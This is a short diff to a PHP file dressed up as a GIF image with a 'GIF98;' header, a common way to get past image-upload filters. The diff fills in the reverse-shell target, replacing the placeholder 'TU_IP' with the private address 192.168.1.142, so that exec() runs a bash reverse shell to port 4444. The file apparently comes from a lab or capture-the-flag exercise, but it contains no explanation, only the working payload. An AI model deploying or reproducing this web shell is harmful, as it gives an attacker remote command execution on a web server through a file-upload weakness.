@@ -1,4 +1,4 @@
 GIF98;
 <?php
-exec("/bin/bash -c 'bash -i >& /dev/tcp/TU_IP/4444 0>&1'");
+exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.142/4444 0>&1'");
 ?>
